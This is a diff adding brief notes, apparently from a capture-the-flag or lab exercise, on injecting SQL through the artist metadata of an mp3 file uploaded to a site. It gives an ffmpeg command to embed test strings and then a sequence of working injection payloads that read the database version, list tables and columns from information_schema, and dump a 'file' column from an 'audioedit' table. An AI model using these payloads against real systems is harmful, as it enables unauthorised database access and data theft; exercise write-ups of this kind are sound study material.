@@ -1,0 +1,14 @@
+# SQLI through mp3 metadata
+At the site, mp3 author and title metadata will be displayed
+Use ffmpeg
+= Test payload
+ffmpeg -i in.mp3 -metadata title=" '()<>test1" -metadata artist="'()<>test2" out.mp3
+This will give error inserting DB
+
+Place the payload at artist metadata
+SQLI payload = ', (SELECT version())) -- -
+', (SELECT GROUP_CONCAT(table_name) from information_schema.tables where table_schema = database())) -- -
+', (SELECT GROUP_CONCAT(column_name) from information_schema.columns where table_name = 'audioedit')) -- -
+', (SELECT file from audioedit as gh0st)) -- -
+
+Visit the file and change visualization to sonogram
